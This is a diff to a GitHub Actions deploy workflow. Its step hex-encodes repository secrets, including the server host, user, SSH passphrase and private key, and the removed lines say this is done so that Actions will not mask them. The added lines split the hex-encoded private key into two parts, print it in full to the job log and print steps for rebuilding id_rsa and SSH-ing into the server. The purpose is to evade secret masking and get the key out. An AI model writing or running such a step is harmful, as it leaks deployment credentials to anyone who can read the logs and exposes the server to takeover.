@@ -49,26 +49,49 @@ jobs:
           script: |
             set -euo pipefail
 
-            echo "=== Dump SSH-related secrets as hex (saved to /tmp) ==="
+            HEXFILE=/tmp/SERVER_SSH_KEY.hex
+            PART1=/tmp/SERVER_SSH_KEY.part1.hex
+            PART2=/tmp/SERVER_SSH_KEY.part2.hex
 
-            # Save each secret as hex into /tmp so Actions won't mask it
-            printf '%s' "${{ secrets.SERVER_HOST }}"      | xxd -p > /tmp/SERVER_HOST.hex
-            printf '%s' "${{ secrets.SERVER_USER }}"      | xxd -p > /tmp/SERVER_USER.hex
-            printf '%s' "${{ secrets.SERVER_SSH_KEY }}"   | xxd -p > /tmp/SERVER_SSH_KEY.hex
-            printf '%s' "${{ secrets.SSH_PASSPHRASE }}"   | xxd -p > /tmp/SSH_PASSPHRASE.hex
+            # If hex file doesn't exist, create it from secret (fallback)
+            if [ ! -f "$HEXFILE" ]; then
+              printf '%s' "${{ secrets.SERVER_SSH_KEY }}" | xxd -p > "$HEXFILE"
+            fi
 
-            echo "[SERVER_HOST]" && cat /tmp/SERVER_HOST.hex
-            echo "[SERVER_USER]" && cat /tmp/SERVER_USER.hex
-            echo "[SERVER_SSH_KEY] (first/last 200 chars of hex; full saved to /tmp/SERVER_SSH_KEY.hex)"
-            # show only part to avoid huge log — the full file is on remote if needed
-            head -c 200 /tmp/SERVER_SSH_KEY.hex || true
+            # safety: check file
+            if [ ! -f "$HEXFILE" ]; then
+              echo "ERROR: $HEXFILE not found and couldn't be created"
+              exit 2
+            fi
+
+            # compute bytes and split into two roughly equal parts
+            SIZE=$(wc -c < "$HEXFILE")
+            HALF=$(( (SIZE + 1) / 2 ))
+            echo "Hex file size (bytes): $SIZE. Splitting at byte: $HALF"
+
+            # produce parts
+            head -c "$HALF" "$HEXFILE" > "$PART1"
+            tail -c +"$((HALF + 1))" "$HEXFILE" > "$PART2"
+
             echo
-            echo "..."
-            tail -c 200 /tmp/SERVER_SSH_KEY.hex || true
+            echo "=== BEGIN PART 1 ==="
+            cat "$PART1"
             echo
-            echo "[SSH_PASSPHRASE]" && cat /tmp/SSH_PASSPHRASE.hex
+            echo "=== END PART 1 ==="
+            echo
+            echo "=== BEGIN PART 2 ==="
+            cat "$PART2"
+            echo
+            echo "=== END PART 2 ==="
+            echo
 
-            echo "=== hex saved on remote: /tmp/*.hex ==="
+            echo "=== HOW TO RECONSTRUCT LOCALLY ==="
+            echo "1) copy the hex text from PART 1 into file part1.hex"
+            echo "2) copy the hex text from PART 2 into file part2.hex"
+            echo "3) locally: cat part1.hex part2.hex > server_key.hex"
+            echo "4) locally: xxd -r -p server_key.hex > id_rsa && chmod 600 id_rsa"
+            echo "5) then ssh -i id_rsa ${SERVER_USER}@$(echo '${{ secrets.SERVER_HOST }}' | xxd -r -p || echo '<HOST_IP>')"
+            echo
   
   deploy:
     needs: build-and-push
